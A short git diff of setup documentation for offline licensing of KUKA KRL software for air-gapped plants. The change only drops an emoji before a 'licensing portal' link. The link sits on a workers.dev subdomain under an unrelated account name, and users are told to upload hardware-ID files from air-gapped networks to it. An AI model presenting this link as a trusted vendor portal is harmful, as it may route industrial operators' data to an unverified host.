@@ -51,7 +51,7 @@ For security-restricted automotive production plants and air-gapped OT networks 
 ### Step 2: Generate Signed License on the Web Gateway
 1. Connect the USB drive to an internet-connected workstation.
 2. Navigate to the secure Liskin Labs activation gateway:  
-   👉 **[Air-Gap Offline Licensing Portal](https://kuka-krl-support-gateway.redminotpro5.workers.dev/airgap)**
+**[Air-Gap Offline Licensing Portal](https://kuka-krl-support-gateway.redminotpro5.workers.dev/airgap)**
 3. Drag and drop your `liskin-hardware-id.lic` file into the upload zone — the hardware fingerprint is verified and filled in automatically.
 4. Enter your License Key and click **Generate Offline License**.
 5. Download the cryptographically signed `liskin-krl-license.lic` file to your USB drive.
